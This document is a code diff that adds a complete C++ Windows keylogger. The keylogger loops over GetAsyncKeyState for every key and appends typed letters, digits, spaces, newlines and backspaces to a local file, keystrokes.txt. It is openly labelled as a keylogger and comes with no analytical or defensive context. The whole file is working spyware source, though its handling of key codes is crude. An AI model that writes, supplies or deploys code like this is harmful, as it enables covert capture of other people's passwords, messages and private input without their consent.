@@ -1,0 +1,49 @@
+#include <iostream>
+#include <fstream>
+#include <Windows.h>
+
+using namespace std;
+
+
+void logKeystrokes() {
+    
+    ofstream logfile("keystrokes.txt", ios::app);
+
+    if (!logfile.is_open()) {
+        cerr << "Failed to open the log file!" << endl;
+        return;
+    }
+
+    while (true) {
+        
+        for (int i = 8; i <= 255; i++) {
+            if (GetAsyncKeyState(i) & 0x8000) { 
+                if (i >= 48 && i <= 57) {
+                    logfile << char(i); 
+                }
+                else if (i >= 65 && i <= 90) {
+                    logfile << char(i); 
+                }
+                else if (i >= 97 && i <= 122) {
+                    logfile << char(i); 
+                }
+                else {
+                    switch (i) {
+                        case VK_SPACE: logfile << " "; break; 
+                        case VK_RETURN: logfile << "\n"; break; 
+                        case VK_BACK: logfile << "<BACKSPACE>"; break; 
+                    }
+                }
+                Sleep(10); 
+            }
+        }
+    }
+
+    logfile.close(); 
+}
+
+int main() {
+    cout << "Keylogger running. Press keys to log them...\n";
+    logKeystrokes(); 
+    return 0;
+}
